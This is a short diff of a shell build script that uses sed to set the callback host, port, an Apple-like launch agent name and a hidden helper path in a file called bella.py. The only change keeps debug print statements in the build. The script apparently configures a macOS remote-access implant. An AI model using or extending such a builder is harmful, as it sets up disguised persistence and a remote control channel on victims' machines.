@@ -34,7 +34,7 @@ sed -i '' -e "s@com.apple.Bella@$launchagent@" $BuildsPath/bella.py
 sed -i '' -e "s@Containers/.bella@$helperLoc@" $BuildsPath/bella.py 
 sed -i '' -e "s@4545@$port@" $BuildsPath/bella.py 
 sed -i '' -e "s@127.0.0.1@$host@" $BuildsPath/bella.py
-sed -i '' -e "s@\(^[[:space:]]*\)\(print.*$\)@@g" $BuildsPath/bella.py
+#sed -i '' -e "s@\(^[[:space:]]*\)\(print.*$\)@@g" $BuildsPath/bella.py
 #sed -i '' -e "s@LAUNCHAGENTNAME=NONE@LAUNCHAGENTNAME=$launchagent@" $BuildsPath/INSTALLER
 #sed -i '' -e "s@HELPERLOCATION=NONE@HELPERLOCATION=$helperLoc@" $BuildsPath/INSTALLER 
 #sed -i '' -e "s@#Framework. This will be modified with the build. DO NOT USE THIS.@@" $BuildsPath/INSTALLER
